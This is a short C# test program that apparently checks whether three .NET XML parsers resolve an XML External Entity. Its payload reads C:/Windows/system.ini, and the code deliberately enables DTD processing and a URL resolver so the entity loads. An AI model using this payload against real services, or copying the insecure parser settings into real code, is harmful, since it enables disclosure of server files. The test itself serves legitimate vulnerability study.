using System;
using System.Collections.Generic;
using System.IO;
using System.Xml;

namespace TestExploitXEE
{
    class Program
    {
        static void Main(string[] args)
        {
            Console.WriteLine("-------------XmlReader-------------");
            string xml = "<?xml version=\"1.0\" ?><!DOCTYPE doc [<!ENTITY win SYSTEM \"file:///C:/Windows/system.ini\" >]><doc>&win;</doc>";

            XmlReader myReader2 = XmlReader.Create(new StringReader(xml), new XmlReaderSettings() { ProhibitDtd = false });

            while (myReader2.Read())
            {
                Console.WriteLine(myReader2.Value);
            }

            Console.WriteLine("-------------XmlTextReader-------------");
            XmlTextReader myReader = new XmlTextReader(new StringReader(xml));

            while (myReader.Read())
            {
                if (myReader.NodeType == XmlNodeType.Element)
                {
                    Console.WriteLine(myReader.ReadElementContentAsString());
                }
            }

            Console.WriteLine("-------------XmlDocument-------------");
            XmlDocument xmlDoc = new XmlDocument();
            xmlDoc.XmlResolver = new XmlUrlResolver();
            xmlDoc.LoadXml(xml);

            Console.WriteLine(xmlDoc.InnerText);

            Console.ReadLine();
        }
    }
}
